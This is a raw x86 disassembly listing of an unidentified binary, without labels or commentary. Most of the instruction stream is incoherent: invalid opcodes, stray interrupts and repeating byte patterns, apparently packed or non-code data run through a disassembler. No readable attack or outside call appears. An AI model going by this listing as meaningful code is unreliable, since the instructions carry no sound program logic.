  423b1e:	jno    0x423b90
  423b20:	mov    ebp,0xefef
  423b25:	or     dh,BYTE PTR [esi-0x30]
  423b28:	int    0x76
  423b2a:	mov    ch,cl
  423b2c:	lea    ebp,ds:0xcd2d96cd
  423b32:	add    DWORD PTR [ecx],edx
  423b34:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423b3e:	shr    edx,cl
  423b40:	sub    BYTE PTR [ebx+0x13],dl
  423b43:	jno    0x423b12
  423b45:	lea    esi,[ebp+0x3bb596cd]
  423b4b:	or     al,0x3b
  423b4d:	cdq    
  423b4e:	shr    ebx,cl
  423b50:	xchg   edx,eax
  423b51:	shr    edx,cl
  423b53:	sub    BYTE PTR [ebx+0x13],dl
  423b56:	jno    0x423b58
  423b58:	(bad)  
  423b59:	add    BYTE PTR gs:[eax+0x1c],dh
  423b5d:	int    0x76
  423b5f:	rcl    bl,1
  423b61:	ins    DWORD PTR es:[edi],dx
  423b62:	xchg   edx,eax
  423b63:	cmp    ecx,ecx
  423b65:	inc    ebx
  423b66:	leave  
  423b67:	int    0x76
  423b69:	mov    ch,cl
  423b6b:	lea    ebp,ds:0x811101cd
  423b71:	add    BYTE PTR [eax-0x29d26933],0x54
  423b78:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423b7b:	cdq    
  423b7c:	shr    ebx,cl
  423b7e:	xchg   edx,eax
  423b7f:	shr    edx,cl
  423b81:	sub    BYTE PTR [ebx+0x13],dl
  423b84:	jno    0x423b53
  423b86:	lea    esi,[ebp+0x3bb596cd]
  423b8c:	or     al,0x3b
  423b8e:	cdq    
  423b8f:	shr    ebx,cl
  423b91:	xchg   edx,eax
  423b92:	shr    edx,cl
  423b94:	sub    BYTE PTR [ebx+0x13],dl
  423b97:	jno    0x423b99
  423b99:	(bad)  
  423b9a:	jne    0x423b9c
  423b9c:	jo     0x423bba
  423b9e:	int    0x76
  423ba0:	lods   eax,DWORD PTR ds:[esi]
  423ba1:	or     dh,BYTE PTR [esi+0x75]
  423ba4:	int    0x76
  423ba6:	cmp    eax,0xecfd760a
  423bab:	cmp    BYTE PTR [ebx],bh
  423bad:	or     al,0x3b
  423baf:	cdq    
  423bb0:	shr    ebx,cl
  423bb2:	xchg   edx,eax
  423bb3:	shr    edx,cl
  423bb5:	sub    BYTE PTR [ebx+0x13],dl
  423bb8:	jno    0x423b87
  423bba:	lea    esi,[ebp+0x3bb596cd]
  423bc0:	or     al,0x3b
  423bc2:	cdq    
  423bc3:	shr    ebx,cl
  423bc5:	xchg   edx,eax
  423bc6:	shr    edx,cl
  423bc8:	sub    BYTE PTR [ebx+0x13],dl
  423bcb:	jno    0x423bcd
  423bcd:	(bad)  
  423bce:	lods   eax,DWORD PTR ds:[esi]
  423bcf:	add    BYTE PTR [eax+0x1c],dh
  423bd2:	int    0x76
  423bd4:	std    
  423bd5:	or     dh,BYTE PTR [esi+0x1d]
  423bd8:	int    0x76
  423bda:	jne    0x423be6
  423bdc:	out    0x55,al
  423bde:	or     dh,BYTE PTR [esi-0x30]
  423be1:	leave  
  423be2:	jbe    0x423b81
  423be4:	inc    ecx
  423be5:	and    DWORD PTR [esi+0x5576cd35],eax
  423beb:	int    0x8d
  423bed:	push   ebp
  423bee:	cmp    edi,DWORD PTR [ecx+0x3b]
  423bf1:	or     al,0xd3
  423bf3:	lods   eax,DWORD PTR ds:[esi]
  423bf4:	sub    bl,dl
  423bf6:	jmp    0x423b8a
  423bf8:	push   ebx
  423bf9:	ror    DWORD PTR [edx],cl
  423bfb:	jbe    0x423c42
  423bfd:	int    0x76
  423bff:	push   ebp
  423c00:	int    0x8d
  423c02:	push   ebp
  423c03:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c06:	or     al,0xd3
  423c08:	lods   eax,DWORD PTR ds:[esi]
  423c09:	sub    bl,dl
  423c0b:	jmp    0x423b9f
  423c0d:	push   ebx
  423c0e:	ror    DWORD PTR [edx],cl
  423c10:	jbe    0x423c1f
  423c12:	leave  
  423c13:	jbe    0x423baa
  423c15:	dec    eax
  423c16:	and    DWORD PTR [esi-0x528936cb],eax
  423c1c:	ret    0x8621
  423c1f:	xor    eax,0xcd5576cd
  423c24:	lea    edx,[ebp+0x3b]
  423c27:	jns    0x423c64
  423c29:	or     al,0xd3
  423c2b:	jmp    0x423bbf
  423c2d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c33:	lea    ebx,ds:0x52f7d43
  423c39:	push   ss
  423c3a:	xchg   DWORD PTR [eax-0x6d241480],eax
  423c40:	add    BYTE PTR [eax-0x326a7233],0x76
  423c47:	xchg   ebp,eax
  423c48:	int    0x96
  423c4a:	inc    ebp
  423c4b:	cmp    eax,ebp
  423c4d:	cmp    ecx,DWORD PTR [edi]
  423c4f:	sar    DWORD PTR [ebp+0x28f2d392],cl
  423c55:	push   ebx
  423c56:	jge    0x423c25
  423c58:	jbe    0x423c77
  423c5a:	xor    edx,edx
  423c5c:	cmp    ebx,edx
  423c5e:	clc    
  423c5f:	add    cl,BYTE PTR [edx]
  423c61:	jbe    0x423c70
  423c63:	int    0x76
  423c65:	lods   eax,DWORD PTR ds:[esi]
  423c66:	int    0x8d
  423c68:	lods   eax,DWORD PTR ds:[esi]
  423c69:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c6c:	or     al,0xd3
  423c6e:	jmp    0x423c02
  423c70:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423c76:	lea    ecx,ds:0x16d87d43
  423c7c:	int    0x76
  423c7e:	lods   eax,DWORD PTR ds:[esi]
  423c7f:	int    0x8d
  423c81:	lods   eax,DWORD PTR ds:[esi]
  423c82:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c85:	or     al,0xd3
  423c87:	lods   eax,DWORD PTR ds:[esi]
  423c88:	sub    bl,dl
  423c8a:	jmp    0x423c1e
  423c8c:	push   ebx
  423c8d:	ror    DWORD PTR [edx],cl
  423c8f:	jbe    0x423c9e
  423c91:	int    0x76
  423c93:	xchg   ebp,eax
  423c94:	int    0x8d
  423c96:	xchg   ebp,eax
  423c97:	cmp    edi,DWORD PTR [ecx+0x3b]
  423c9a:	or     al,0xd3
  423c9c:	lods   eax,DWORD PTR ds:[esi]
  423c9d:	sub    bl,dl
  423c9f:	jmp    0x423c33
  423ca1:	push   ebx
  423ca2:	ror    ebp,cl
  423ca4:	lea    ecx,ds:0xad3d12f
  423caa:	jbe    0x423cb9
  423cac:	int    0x76
  423cae:	push   ebp
  423caf:	int    0x8d
  423cb1:	push   ebp
  423cb2:	cmp    edi,DWORD PTR [ecx+0x3b]
  423cb5:	or     al,0xd3
  423cb7:	jmp    0x423c4b
  423cb9:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423cbf:	lea    ecx,ds:0x52f7d43
  423cc5:	pusha  
  423cc6:	xchg   edx,eax
  423cc7:	add    BYTE PTR [eax+0xa0d76cd],0x76
  423cce:	or     eax,0x874576cd
  423cd3:	jbe    0x423ca5
  423cd5:	or     ah,dh
  423cd7:	cmp    eax,0x5d5d760a
  423cdc:	inc    ecx
  423cdd:	and    DWORD PTR [esi+0x6d760a35],eax
  423ce3:	leave  
  423ce4:	jbe    0x423d4b
  423ce6:	cmp    DWORD PTR [ecx],esp
  423ce8:	xchg   BYTE PTR ds:0xb22576c9,dh
  423cee:	and    DWORD PTR [esi-0xe89f5cb],eax
  423cf4:	int    0x76
  423cf6:	cmp    eax,0x3b3d8dcd
  423cfb:	jns    0x423d38
  423cfd:	or     al,0xd3
  423cff:	lods   eax,DWORD PTR ds:[esi]
  423d00:	sub    bl,dl
  423d02:	jmp    0x423c96
  423d04:	push   ebx
  423d05:	ror    DWORD PTR [edx],cl
  423d07:	jbe    0x423d86
  423d09:	int    0x6d
  423d0b:	jmp    0x423d13
  423d0d:	add    DWORD PTR [eax-0x36923280],0x8c06
  423d17:	add    BYTE PTR [ebx],cl
  423d19:	and    DWORD PTR [esi-0x369232cb],eax
  423d1f:	push   es
  423d20:	jl     0x423d22
  423d22:	add    BYTE PTR [eax],al
  423d24:	mul    DWORD PTR [ecx]
  423d26:	xchg   BYTE PTR ds:0x6dcd6dcd,dh
  423d2c:	int    0x76
  423d2e:	icebp  
  423d2f:	int    0x8d
  423d31:	icebp  
  423d32:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d35:	or     al,0xd3
  423d37:	lods   eax,DWORD PTR ds:[esi]
  423d38:	sub    bl,dl
  423d3a:	jmp    0x423cce
  423d3c:	push   ebx
  423d3d:	ror    ebp,cl
  423d3f:	lea    edi,[ebp+0x2f]
  423d42:	rcl    ebx,1
  423d44:	int    0x8d
  423d46:	pop    ebp
  423d47:	retf   0x8884
  423d4a:	or     DWORD PTR [esi-0x1f],esi
  423d4d:	int    0x6d
  423d4f:	int    0x76
  423d51:	icebp  
  423d52:	int    0x8d
  423d54:	icebp  
  423d55:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423d58:	jns    0x423d2d
  423d5a:	jmp    0x423cee
  423d5c:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423d62:	lea    edi,[ebp+0x2f]
  423d65:	rcl    ebx,1
  423d67:	int    0x8d
  423d69:	gs int 0x96
  423d6c:	cmp    ecx,DWORD PTR gs:[edi]
  423d6f:	cmp    edx,ebp
  423d71:	shl    edx,cl
  423d73:	sub    bl,dl
  423d75:	repz xchg edx,eax
  423d77:	push   ebx
  423d78:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423d7e:	das    
  423d7f:	pop    ecx
  423d80:	dec    esp
  423d81:	mov    ch,cl
  423d83:	push   es
  423d84:	mov    WORD PTR [eax],es
  423d86:	add    BYTE PTR [eax],al
  423d88:	int    0x17
  423d8a:	mov    WORD PTR [eax],es
  423d8c:	add    BYTE PTR [eax],al
  423d8e:	cmp    edi,DWORD PTR [ecx+0x3b]
  423d91:	aad    0xd3
  423d93:	lods   eax,DWORD PTR ds:[esi]
  423d94:	sub    bl,dl
  423d96:	repz xchg edx,eax
  423d98:	push   ebx
  423d99:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423d9f:	loope  0x423ddc
  423da1:	jge    0x423dac
  423da3:	(bad)  
  423da4:	loope  0x423d73
  423da6:	ins    DWORD PTR es:[edi],dx
  423da7:	retf   0xe176
  423daa:	int    0x8d
  423dac:	icebp  
  423dad:	int    0x96
  423daf:	icebp  
  423db0:	cmp    ecx,DWORD PTR [edi]
  423db2:	cmp    edx,ebp
  423db4:	shl    ebx,cl
  423db6:	xchg   edx,eax
  423db7:	shl    edx,cl
  423db9:	sub    BYTE PTR [ebx+0x13],dl
  423dbc:	int    0x96
  423dbe:	jge    0x423def
  423dc0:	rcl    DWORD PTR [ebx],1
  423dc2:	int    0x96
  423dc4:	pop    ebp
  423dc5:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423dcc:	icebp  
  423dcd:	int    0x8d
  423dcf:	icebp  
  423dd0:	cmp    edi,DWORD PTR [ecx+0x3b]
  423dd3:	or     al,0xd3
  423dd5:	lods   eax,DWORD PTR ds:[esi]
  423dd6:	sub    bl,dl
  423dd8:	jmp    0x423d6c
  423dda:	push   ebx
  423ddb:	ror    ebp,cl
  423ddd:	lea    edi,[ebp+0x2f]
  423de0:	rcl    ebx,1
  423de2:	int    0x8d
  423de4:	pop    ebp
  423de5:	retf   0x8884
  423de8:	or     DWORD PTR [esi-0x1f],esi
  423deb:	int    0x6d
  423ded:	int    0x76
  423def:	icebp  
  423df0:	int    0x8d
  423df2:	icebp  
  423df3:	cmp    edi,DWORD PTR [ecx-0x2d]
  423df6:	lods   eax,DWORD PTR ds:[esi]
  423df7:	sub    BYTE PTR [ebx],bh
  423df9:	or     al,0xd3
  423dfb:	jmp    0x423d8f
  423dfd:	push   ebx
  423dfe:	ror    ebp,cl
  423e00:	lea    edi,[ebp+0x2f]
  423e03:	rcl    ebx,1
  423e05:	int    0x8d
  423e07:	ins    DWORD PTR es:[edi],dx
  423e08:	int    0x96
  423e0a:	ins    DWORD PTR es:[edi],dx
  423e0b:	cmp    ecx,DWORD PTR [edi]
  423e0d:	cmp    edx,ebp
  423e0f:	shl    edx,cl
  423e11:	sub    bl,dl
  423e13:	repz xchg edx,eax
  423e15:	push   ebx
  423e16:	adc    eax,DWORD PTR [edi+0x5d8dcdd3]
  423e1c:	das    
  423e1d:	pop    ecx
  423e1e:	dec    esp
  423e1f:	mov    ch,cl
  423e21:	push   es
  423e22:	jl     0x423e24
  423e24:	add    BYTE PTR [eax],al
  423e26:	int    0x17
  423e28:	jl     0x423e2a
  423e2a:	add    BYTE PTR [eax],al
  423e2c:	cmp    edi,DWORD PTR [ecx+0x3b]
  423e2f:	aad    0xd3
  423e31:	lods   eax,DWORD PTR ds:[esi]
  423e32:	sub    bl,dl
  423e34:	repz xchg edx,eax
  423e36:	push   ebx
  423e37:	rol    BYTE PTR [edi-0x72a6d02d],cl
  423e3d:	loope  0x423e7a
  423e3f:	jge    0x423e4a
  423e41:	(bad)  
  423e42:	loope  0x423e11
  423e44:	ins    DWORD PTR es:[edi],dx
  423e45:	retf   0xe176
  423e48:	int    0x8d
  423e4a:	icebp  
  423e4b:	int    0x96
  423e4d:	icebp  
  423e4e:	cmp    ecx,DWORD PTR [edi]
  423e50:	cmp    edx,ebp
  423e52:	shl    ebx,cl
  423e54:	xchg   edx,eax
  423e55:	shl    edx,cl
  423e57:	sub    BYTE PTR [ebx+0x13],dl
  423e5a:	int    0x96
  423e5c:	jge    0x423e8d
  423e5e:	rcl    DWORD PTR [ebx],1
  423e60:	int    0x96
  423e62:	pop    ebp
  423e63:	or     DWORD PTR [ecx+esi*1+0x76cd6dcd],eax
  423e6a:	and    eax,0x3b258dcd
  423e6f:	or     al,0x3b
  423e71:	jns    0x423e46
  423e73:	jmp    0x423e07
  423e75:	shr    DWORD PTR [ebp-0x322cacd8],cl
  423e7b:	lea    ebp,[ebp-0x33]
  423e7e:	xchg   esi,eax
  423e7f:	ins    DWORD PTR es:[edi],dx
  423e80:	cmp    ecx,DWORD PTR [edi]
  423e82:	cmp    edx,ebp
  423e84:	shl    edx,cl
  423e86:	sub    bl,dl
  423e88:	repz xchg edx,eax
  423e8a:	push   ebx
  423e8b:	adc    ebp,DWORD PTR [edi]
  423e8d:	rcl    ebx,1
  423e8f:	xchg   DWORD PTR [esi+0x7d],esi
  423e92:	or     dh,BYTE PTR [esi+0x7d]
  423e95:	int    0x76
  423e97:	jge    0x423e66
  423e99:	lea    ecx,ds:0xb2f7d43
  423e9f:	(bad)  
  423ea0:	inc    DWORD PTR [eax]
  423ea2:	add    ch,cl
  423ea4:	jbe    0x423f13
  423ea6:	int    0x8d
  423ea8:	ins    DWORD PTR es:[edi],dx
  423ea9:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423eac:	jmp    0x423e40
  423eae:	cmp    edi,DWORD PTR [ecx-0x2d]
  423eb1:	lods   eax,DWORD PTR ds:[esi]
  423eb2:	sub    BYTE PTR [ebx-0x2d],dl
  423eb5:	int    0x8d
  423eb7:	or     eax,0xcdd3d12f
  423ebc:	lea    edi,ds:0xf2d30f3b
  423ec2:	sub    BYTE PTR [ebx-0x2d],dl
  423ec5:	int    0x8d
  423ec7:	cmp    eax,0xebd30c3b
  423ecc:	xchg   edx,eax
  423ecd:	push   ebx
  423ece:	ror    DWORD PTR [edx],cl
  423ed0:	jbe    0x423f37
  423ed2:	int    0x76
  423ed4:	popf   
  423ed5:	int    0x8d
  423ed7:	popf   
  423ed8:	cmp    ecx,DWORD PTR [ebx+edx*8]
  423edb:	jmp    0x423e6f
  423edd:	cmp    edi,DWORD PTR [ecx-0x2d]
  423ee0:	lods   eax,DWORD PTR ds:[esi]
  423ee1:	sub    BYTE PTR [ebx-0x2d],dl
  423ee4:	int    0x8d
  423ee6:	popf   
  423ee7:	int    0x96
  423ee9:	popf   
  423eea:	cmp    ecx,DWORD PTR [edi]
  423eec:	shl    edx,cl
  423eee:	sub    BYTE PTR [ebx],bh
  423ef0:	aad    0xd3
  423ef2:	repz xchg edx,eax
  423ef4:	push   ebx
  423ef5:	adc    eax,DWORD PTR [edi+0x7d87658d]
  423efb:	xchg   DWORD PTR [ebp+0x458d0a45],ecx
  423f01:	in     al,dx
  423f02:	sbb    al,0xcd
  423f04:	jbe    0x423ea3
  423f06:	int    0x8d
  423f08:	popf   
  423f09:	cmp    edi,DWORD PTR [ecx+0x3b]
  423f0c:	or     al,0xd3
  423f0e:	lods   eax,DWORD PTR ds:[esi]
  423f0f:	sub    bl,dl
  423f11:	jmp    0x423ea5
  423f13:	push   ebx
  423f14:	rol    DWORD PTR [edi+0x760a4576],cl
  423f1a:	inc    ebp
  423f1b:	int    0x76
  423f1d:	popf   
  423f1e:	int    0x8d
  423f20:	popf   
  423f21:	cmp    edi,DWORD PTR [ecx-0x2d]
  423f24:	lods   eax,DWORD PTR ds:[esi]
  423f25:	sub    BYTE PTR [ebx],bh
  423f27:	or     al,0xd3
  423f29:	jmp    0x423ebd
  423f2b:	push   ebx
  423f2c:	ror    ebp,cl
  423f2e:	lea    ebx,ds:0x76cd7d33
  423f34:	popf   
  423f35:	int    0x96
  423f37:	popf   
  423f38:	cmp    edi,DWORD PTR [ecx+0x3b]
  423f3b:	aad    0xd3
  423f3d:	repz xchg edx,eax
  423f3f:	shr    DWORD PTR [ebp-0x322dacd8],cl
  423f45:	xchg   esi,eax
  423f46:	inc    ebp
  423f47:	das    
  423f48:	rcl    edx,1
  423f4a:	inc    ebx
  423f4b:	shr    DWORD PTR [edi],cl
  423f4d:	pop    es
  423f4e:	adc    ebp,edi
  423f50:	add    BYTE PTR [eax],al
  423f52:	int    0x76
  423f54:	mov    BYTE PTR [eax],al
  423f56:	(bad)  
  423f57:	dec    esp
  423f58:	iret   
  423f59:	jbe    0x423f18
  423f5b:	add    dh,dl
  423f5d:	mov    BYTE PTR [eax-0x33],dh
  423f60:	jbe    0x423eea
  423f62:	int    0x1
  423f64:	xchg   ebp,eax
  423f65:	add    DWORD PTR [eax-0x32afff80],0x1cd8876
  423f6f:	icebp  
  423f70:	add    DWORD PTR [eax+0x500080],0xd600fdd6
  423f7a:	jne    0x423f39
  423f7c:	test   al,0x88
  423f7e:	add    BYTE PTR [eax-0x322f89f6],0x76
  423f85:	stc    
  423f86:	int    0x8d
  423f88:	stc    
  423f89:	cmp    eax,ebp
  423f8b:	cmp    ecx,DWORD PTR [edi]
  423f8d:	shl    edx,cl
  423f8f:	sub    bl,dl
  423f91:	mov    ebp,0xcdd35392
  423f96:	lea    esi,[ebp+0x43]
  423f99:	rcl    esp,cl
  423f9b:	push   esi
  423f9c:	int    0x76
  423f9e:	mov    ch,cl
  423fa0:	lea    ebp,ds:0xcd2d96cd
  423fa6:	add    DWORD PTR [ecx],edx
  423fa8:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423fb2:	shr    edx,cl
  423fb4:	sub    BYTE PTR [ebx+0x13],dl
  423fb7:	jno    0x423f86
  423fb9:	(bad)  
  423fba:	stc    
  423fbb:	int    0x96
  423fbd:	stc    
  423fbe:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423fc1:	cdq    
  423fc2:	shr    ebx,cl
  423fc4:	xchg   edx,eax
  423fc5:	shr    edx,cl
  423fc7:	sub    BYTE PTR [ebx+0x13],dl
  423fca:	jno    0x423fcc
  423fcc:	(bad)  
  423fcd:	jne    0x423fcf
  423fcf:	jo     0x423fed
  423fd1:	stos   BYTE PTR es:[edi],al
  423fd2:	test   al,0x63
  423fd4:	retf   
  423fd5:	ror    BYTE PTR [eax-0x12326980],cl
  423fdb:	add    al,0xed
  423fdd:	and    al,0x98
  423fdf:	int    0x11
  423fe1:	int    0x12
  423fe3:	sub    eax,0x4808081
  423fe8:	pop    esp
  423fe9:	sub    BYTE PTR [edi],0x5
  423fec:	dec    edx
  423fed:	add    DWORD PTR [eax+0x2fda0680],0x80819205
  423ff7:	add    BYTE PTR [esi],0xf7
  423ffa:	das    
  423ffb:	add    eax,0x80808003
  424000:	int    0x7
  424002:	or     DWORD PTR [eax+0x6d068080],eax
  424008:	das    
  424009:	add    eax,0x808080e9
  42400e:	add    al,0x69
  424010:	int3   
  424011:	add    BYTE PTR [eax+0x52f3080],0xe2
  424018:	add    BYTE PTR [eax+0x54985e80],0x2f
  42401f:	add    eax,0x808080e3
  424024:	int    0xc1
  424026:	and    eax,0x4808081
  42402b:	mov    dh,0x11
  42402d:	or     ch,0x13
  424030:	xor    ecx,DWORD PTR [esi-0x79]
  424033:	shr    BYTE PTR [edi],cl
  424035:	mov    ebx,0x8d0a4c70
  42403a:	mov    ch,0x2f
  42403c:	mov    ebx,0x13874e7c
  424041:	das    
  424042:	add    eax,0x80808049
  424047:	iret   
  424048:	jl     0x42405e
  42404a:	pop    ebx
  42404b:	or     cl,BYTE PTR [ebp+0x69bd]
  424051:	add    BYTE PTR [ebx-0x2baef966],al
  424057:	or     ebp,0x31
  42405a:	add    al,0xb6
  42405c:	cmc    
  42405d:	sub    BYTE PTR [ebx],0x99
  424060:	xchg   ecx,esi
  424062:	das    
  424063:	mov    ebx,0xbb2f4ee0
  424068:	mov    al,ds:0xd4fc874c
  42406d:	mov    esi,0xa148acf
  424072:	(bad)  
  424073:	in     eax,dx
  424074:	push   es
  424075:	push   ecx
  424076:	aam    0x6e
  424078:	int    0x89
  42407a:	add    al,0xb6
  42407c:	stc    
  42407d:	sub    BYTE PTR [ebx],0xf
  424080:	xchg   DWORD PTR [ebp+0x2f],edi
  424083:	mov    ebx,0xbb2f4ede
  424088:	sahf   
  424089:	dec    esp
  42408a:	xchg   esp,edi
  42408c:	aam    0x33
  42408e:	iret   
  42408f:	ficom  WORD PTR [edx+ecx*1]
  424092:	out    0xfd,al
  424094:	int    0xe6
  424096:	std    
  424097:	int    0x6a
  424099:	push   es
  42409a:	add    ah,dl
  42409c:	xchg   ch,cl
  42409e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42409f:	mov    ch,0x81
  4240a1:	and    al,0x8b
  4240a3:	das    
  4240a4:	mov    ebx,0xbb2f4ede
  4240a9:	sahf   
  4240aa:	dec    esp
  4240ab:	add    BYTE PTR [esi-0x7],dh
  4240ae:	add    al,0x76
  4240b0:	std    
  4240b1:	mov    BYTE PTR [edi-0x619a104],al
  4240b7:	sbb    ch,0x2f
  4240ba:	mov    ebx,0xbb2f4ee0
  4240bf:	mov    al,ds:0xed8dcd4c
  4240c4:	add    BYTE PTR [esi-0xb],dh
  4240c7:	add    al,0xd3
  4240c9:	mov    BYTE PTR [edi-0x1272f504],al
  4240cf:	pop    esi
  4240d0:	out    0xf5,al
  4240d2:	sub    BYTE PTR ds:0x2fbd8dcd,0xbb
  4240d9:	jo     0x424129
  4240db:	das    
  4240dc:	mov    ebx,0x76004cdc
  4240e1:	adc    DWORD PTR [ebx+edx*8],eax
  4240e4:	mov    BYTE PTR [edi-0x4272f527],al
  4240ea:	pop    esi
  4240eb:	xchg   esi,eax
  4240ec:	adc    DWORD PTR [edi],ebp
  4240ee:	or     ebp,DWORD PTR [esi-0x56000000]
  4240f4:	arpl   WORD PTR [ebx],di
  4240f6:	ins    DWORD PTR es:[edi],dx
  4240f7:	ins    BYTE PTR es:[edi],dx
  4240f8:	in     al,dx
  4240f9:	xchg   edx,eax
  4240fa:	cmp    ebp,DWORD PTR [ebp-0x58]
  4240fd:	retf   
  4240fe:	lds    edx,FWORD PTR [esi+0xacdedcd]
  424104:	sub    eax,0xcd808081
  424109:	jbe    0x424157
  42410b:	add    al,0xed
  42410d:	xor    BYTE PTR [ebx+0x3b],bl
  424110:	fstp   QWORD PTR [eax+0x2f1e5e9a]
  424116:	add    eax,0x8080800b
  42411b:	inc    ebx
  42411c:	(bad)
  42411f:	pop    esi
  424120:	pushf  
  424121:	(bad)  
  424123:	test   DWORD PTR [ebx],edi
  424125:	ins    DWORD PTR es:[edi],dx
  424126:	ins    BYTE PTR es:[edi],dx
  424127:	in     al,dx
  424128:	fmul   st,st(5)
  42412a:	ins    BYTE PTR es:[edi],dx
  42412b:	fadd   QWORD PTR [edi+0x7ccd8876]
  424131:	and    al,0xcd
  424133:	jo     0x424169
  424135:	int    0x90
  424137:	adc    al,0xcd
  424139:	fcomp  QWORD PTR [edi+eax*4]
  42413c:	lea    ecx,[eax+0xa889687]
  424142:	(bad)  
  424143:	std    
  424144:	inc    ebx
  424145:	clc    
  424146:	jnp    0x4240cf
  424148:	or     ah,dh
  42414a:	std    
  42414b:	or     ah,BYTE PTR [esi-0x259a107]
  424151:	fsub   st,st(3)
  424153:	inc    ebx
  424154:	pushf  
  424155:	adc    al,0x77
  424157:	xchg   BYTE PTR [edi],ch
  424159:	mov    ebx,0x92eca054
  42415e:	int    0xf4
  424160:	iret   
  424161:	push   esp
  424162:	ror    ebp,0x68
  424165:	push   es
  424166:	add    ah,dl
  424168:	ds xchg esi,esp
  42416b:	mov    BYTE PTR [edx],cl
  42416d:	out    0x11,al
  42416f:	inc    ebx
  424170:	stc    
  424171:	fdiv   DWORD PTR [eax]
  424173:	int    0xa6
  424175:	dec    esp
  424176:	int    0x63
  424178:	in     al,0x87
  42417a:	popf   
  42417b:	inc    ebx
  42417c:	cld    
  42417d:	ja     0x424103
  42417f:	int    0x58
  424181:	in     al,dx
  424182:	mov    BYTE PTR [ebx],dh
  424184:	out    0x88,al
  424186:	or     ch,BYTE PTR [eax-0x33]
  424189:	(bad)  
  42418a:	adc    DWORD PTR [esi],eax
  42418c:	not    esp
  42418e:	dec    esi
  42418f:	int    0xa6
  424191:	stc    
  424192:	dec    ebx
  424193:	or     ah,BYTE PTR [esi-0x259bc07]
  424199:	sbb    BYTE PTR [ebp-0x14],0x8
  42419d:	cmp    ebp,DWORD PTR [ebp-0x56]
  4241a0:	test   al,0x63
  4241a2:	retf   
  4241a3:	ror    BYTE PTR [eax-0x12326980],cl
  4241a9:	add    al,0xed
  4241ab:	push   eax
  4241ac:	pop    ebx
  4241ad:	cwde   
  4241ae:	pop    ebp
  4241af:	dec    ecx
  4241b0:	and    DWORD PTR [esi-0x289f5cb],eax
  4241b6:	leave  
  4241b7:	jbe    0x4241b2
  4241b9:	inc    ecx
  4241ba:	and    DWORD PTR [esi-0x27232cb],eax
  4241c0:	int    0xa6
  4241c2:	std    
  4241c3:	call   0x3b81:0x90cfffc0
  4241ca:	psrlq  mm5,mm3
  4241cd:	xchg   edx,eax
  4241ce:	stos   BYTE PTR es:[edi],al
  4241cf:	cmp    esp,ecx
  4241d1:	shl    ebp,cl
  4241d3:	sub    BYTE PTR [ebx+0xc],dl
  4241d6:	or     cl,BYTE PTR [ebp-0x2723243]
  4241dc:	int    0x8d
  4241de:	std    
  4241df:	int    0x8d
  4241e1:	std    
  4241e2:	int    0x8d
  4241e4:	std    
  4241e5:	int    0x8d
  4241e7:	std    
  4241e8:	int    0x8d
  4241ea:	std    
  4241eb:	int    0x8d
  4241ed:	std    
  4241ee:	int    0x8d
  4241f0:	std    
  4241f1:	int    0x8d
  4241f3:	std    
  4241f4:	int    0x8d
  4241f6:	std    
  4241f7:	leave  
  4241f8:	jbe    0x42420b
  4241fa:	fadd   st,st(5)
  4241fc:	loope  0x424253
  4241fe:	int    0x8d
  424200:	std    
  424201:	int    0xa6
  424203:	std    
  424204:	cmp    esp,ecx
  424206:	cmp    ecx,DWORD PTR [edi]
  424208:	shl    ebp,cl
  42420a:	sub    bl,dl
  42420c:	jmp    0x4241a0
  42420e:	push   ebx
  42420f:	or     al,0xcd
  424211:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424212:	dec    esp
  424213:	int    0x9f
  424215:	sub    eax,0x43808081
  42421a:	push   ebx
  42421b:	das    
  42421c:	add    eax,0x80808717
  424221:	int    0x8d
  424223:	std    
  424224:	int    0xa6
  424226:	std    
  424227:	cmp    ecx,DWORD PTR [edi]
  424229:	cmp    esp,ecx
  42422b:	shr    ebx,cl
  42422d:	xchg   edx,eax
  42422e:	shl    ebp,cl
  424230:	sub    BYTE PTR [ebx+0xc],dl
  424233:	inc    ebx
  424234:	adc    ebp,DWORD PTR [edi]
  424236:	add    eax,0x8080877f
  42423b:	int    0xca
  42423d:	add    DWORD PTR [eax-0x69327f80],eax
  424243:	std    
  424244:	int    0xa6
  424246:	std    
  424247:	cmp    ebx,DWORD PTR [ecx-0xc2c1ec5]
  42424d:	xchg   edx,eax
  42424e:	shl    ebp,cl
  424250:	sub    BYTE PTR [ebx-0x2b],dl
  424253:	inc    ebx
  424254:	adc    ebp,DWORD PTR [edi]
  424256:	add    eax,0x8080875b
  42425b:	xchg   DWORD PTR [ebp-0xe72f578],ecx
  424261:	int    0xf1
  424263:	cmp    ebx,DWORD PTR [ecx-0x1ec46233]
  424269:	shl    ebx,cl
  42426b:	xchg   edx,eax
  42426c:	shl    ebp,cl
  42426e:	sub    BYTE PTR [ebx-0x2b],dl
  424271:	or     dl,BYTE PTR [esi+0x1196cd11]
  424277:	inc    ebx
  424278:	icebp  
  424279:	aam    0x26
  42427b:	int    0x76
  42427d:	std    
  42427e:	int    0x96
  424280:	std    
  424281:	cmp    ebx,ecx
  424283:	cmp    edi,DWORD PTR [ecx-0x2d]
  424286:	jmp    0xd253:0x92bdd328
  42428d:	int    0x96
  42428f:	adc    DWORD PTR [ebx-0x26],esi
  424292:	adc    al,0x5e
  424294:	test   BYTE PTR [edx-0x2a],cl
  424297:	xor    cl,ch
  424299:	jbe    0x424298
  42429b:	int    0x96
  42429d:	std    
  42429e:	cmp    ebx,ecx
  4242a0:	cmp    edi,DWORD PTR [ecx-0x2d]
  4242a3:	jmp    0xd253:0x92bdd328
  4242aa:	int    0x96
  4242ac:	adc    DWORD PTR [ebx-0x26],esi
